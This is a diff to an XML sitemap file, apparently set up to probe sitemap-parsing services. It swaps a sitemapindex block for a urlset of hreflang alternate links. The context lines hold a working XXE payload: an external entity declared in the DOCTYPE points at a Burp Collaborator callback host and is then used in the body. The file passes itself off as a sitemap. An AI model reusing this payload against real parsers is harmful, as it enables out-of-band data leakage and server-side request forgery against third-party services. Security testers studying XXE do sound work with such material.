@@ -3,11 +3,9 @@
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
 <!ENTITY xxe SYSTEM "2psijjbdrllckx0g6c93m2aogfm5au.burpcollaborator.net">]><foo>&xxe;</foo>
-<sitemapindex xmlns="http://www.google.com/schemas/sitemap/0.84">
-<sitemap>
-<loc>https://ddennis574.github.io/aa.html</loc>
-</sitemap>
-<sitemap>
-<loc>hhttps://ddennis574.github.io/aaa.html</loc>
-</sitemap>
-</sitemapindex>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml">
+  <url>
+  	<xhtml:link href="https://ddennis574.github.io/aa.html" hreflang="x-default" rel="alternate"/>
+  	<xhtml:link href="https://ddennis574.github.io/aaa.html" hreflang="aaa" rel="alternate"/>
+  </url>
+</urlset>
